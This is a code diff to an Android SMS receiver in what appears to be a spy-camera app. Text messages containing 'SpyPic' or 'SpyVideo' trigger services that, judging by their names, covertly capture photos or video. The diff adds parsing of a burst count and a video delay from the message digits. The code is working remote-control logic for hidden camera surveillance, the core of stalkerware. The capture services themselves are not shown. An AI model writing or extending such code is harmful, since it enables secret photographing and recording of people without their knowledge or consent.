@@ -8,8 +8,10 @@ import android.telephony.SmsMessage;
 import android.util.Log;
 
 public class SmsReceiver extends BroadcastReceiver {
-    String msg_from;
-    String msgBody;
+    private String msg_from;
+    private String msgBody;
+    private int firstValue;
+    private String LOG_TAG = "SPY_CAM";
 
     @Override
     public void onReceive(Context context, Intent intent) {
@@ -24,19 +26,36 @@ public class SmsReceiver extends BroadcastReceiver {
                         msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                         msg_from = msgs[i].getOriginatingAddress();
                         msgBody = msgs[i].getMessageBody();
-                        if (msgBody.equals("SpyPic")) {
-
-                            Log.i("SPY_CAM" , "Capturing Image");
-                            Intent serviceIntent = new Intent(context, SpyPictureService.class);
-                            context.startService(serviceIntent);
-                        } else if (msgBody.equals("SpyVideo")) {
+                        String intValue = msgBody.replaceAll("[^0-9]", "");
+                        Log.i(LOG_TAG , String.format("requested images %s" , intValue));
+                        String originalMsg = msgBody.replaceAll("[0-9]","");
+                        Log.i("SPY_CAM" , "Msg :" + originalMsg);
+                        if (originalMsg.equals("SpyPic")) {
+                            Log.i("SPY_CAM", "Capturing Image");
+                            Intent picServiceIntent = new Intent(context, SpyPictureService.class);
+                            if (!intValue.isEmpty()) {
+                                firstValue = Character.getNumericValue(intValue.charAt(0));
+                            }
+                            if (firstValue != 0 && firstValue < 5) {
+                                Log.i("SPY_CAM","FirstValue :" + firstValue);
+                                picServiceIntent.putExtra("burstValue", firstValue);
+                            }
+                            context.startService(picServiceIntent);
+                        } else if (originalMsg.equals("SpyVideo")) {
                             Log.i("SPY_CAM", "Capturing Video");
                             Intent videoIntent = new Intent(context, SpyVideoService.class);
+                            if (!intValue.isEmpty()) {
+                                int videoDelay = Integer.parseInt(intValue);
+                                Log.i("SPY_CAM", "videoDuration" + videoDelay);
+                                if (videoDelay < 60) {
+                                    videoIntent.putExtra("video_delay", videoDelay);
+                                }
+                            }
                             context.startService(videoIntent);
                         }
                     }
                 } catch (Exception e) {
-                            Log.d("Exception caught", e.getMessage());
+                    e.printStackTrace();
                 }
             }
         }
